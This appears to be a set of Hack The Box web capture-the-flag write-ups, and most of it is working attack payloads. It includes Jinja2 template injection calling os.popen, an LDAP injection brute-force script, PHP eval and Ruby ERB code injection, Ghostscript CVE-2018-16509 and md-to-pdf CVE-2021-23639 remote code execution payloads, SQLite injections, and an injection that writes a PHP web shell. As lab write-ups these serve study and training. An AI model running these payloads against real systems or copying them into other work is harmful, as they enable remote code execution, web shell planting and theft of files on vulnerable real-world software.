# WEB

## Templeted `Flask/Jinja2 Template Injection`
Flask/Jinja2 Template Injection
Payload:
```
http://<ip_address>/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt')).read()}}
```

## Phonebook `LDAP Injection`
Bypass login using *:* credentials.

Get reese's password -> flag:
Python script: 
```python3
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

proxies = {
    'http': 'http://127.0.0.1:8080'
}

flag = "HTB{"
for i in range(50):
    print("[i] Looking for number " + str(i))
    # print(alphabet)
    for char in alphabet:
        pwd = flag + char + '*'
        r = requests.post("http://<ip_address>/login", data={"username":"reese", "password":pwd}, proxies=proxies)
        if ("'Content-Length': '2586'" in str(r.headers)):
            flag += char
            print("[+] Flag: " + flag)
            break
```



## LoveTok `Code Injection [PHP eval()]`
```url
# Get flag file name
http://<ip_address>/?format=${system($_GET[1])}&1=ls

# Get flag
http://<ip_address>/?format=${system($_GET[1])}&1=cat+flageXXXX
```


## Toxic `Insecure Deserialization` & `Log Poisoning Attack`
### `TODO`



## petpetrcb `CVE-2018-16509`
Ghostscript === 9.23 RCE
Payload:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
```


Payload for this challenge:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

## Under Construction `JWT Algorithm Confusion` & `SQL Injection`
JWT Algorithm Confusion -> https://portswigger.net/web-security/jwt/algorithm-confusion

Next SQL Injection (SQLite3)
```sql
-- Get Tables
user_in_database' union select name,NULL from sqlite_master where type='table' and name not like 'sqlite_%';-- 

-- Get Columns
user_in_database' union select sql,NULL from sqlite_master where tbl_name = 'users' and type = 'table';--

-- Get Flag
user_in_database' and 1=2 UNION SELECT *,NULL from flag_storage;--
```


## Blinker Fluids `CVE-2021-23639`
md-to-pdf < 5.0.0 RCE
Payload:
```
const { mdToPdf } = require('md-to-pdf'); var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE';
```
Payload for this challenge:
```js
// In request:
"---js\n((require(\"child_process\")).execSync(\"cd .. && cat flag.txt > /app/static/instances/RCE.txt\"))\n---RCE;"

// PDF editor on site:
---js
  ((require(\"child_process\")).execSync(\"cd .. && cat flag.txt > /app/static/instances/RCE.txt\"))
---RCE;

```

## Intergalactic POST `SQL Injection with RCE [SQLite3]`
If given arguments arent't properly validated:
```php
$this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
```
We can add `X-Forwarded-For` header and it's value will be passed to `$ip_address`
```sql
X-Forwarded-For: a','a');ATTACH DATABASE '/www/lol.php' AS lol;CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```
Next arguments can be given through URL:
```url
http://104.248.173.13:32130/lol10.php?cmd=cat%20../flag_d055c3346bc2c02.txt
```

## Neofy `Regex Bypass with new line` && `Code Injection`
Regex that should protect against Code Injection:
```ruby
params[:neon] =~ /^[0-9a-z ]+$/i
```
In Ruby (but not only) the ^ and $ match at the start and end of each line. So if any (!) one line is matching, we have a successful match. What we would rather want in this case is matching the beginning and end of the string, which is possible with \A and \z.
Thats why this payload works:
```url
# In request POST /
neon=abc%0a<%25%3d+File.open('/app/flag.txt').read+%25>
%0a -> encoded newline
```
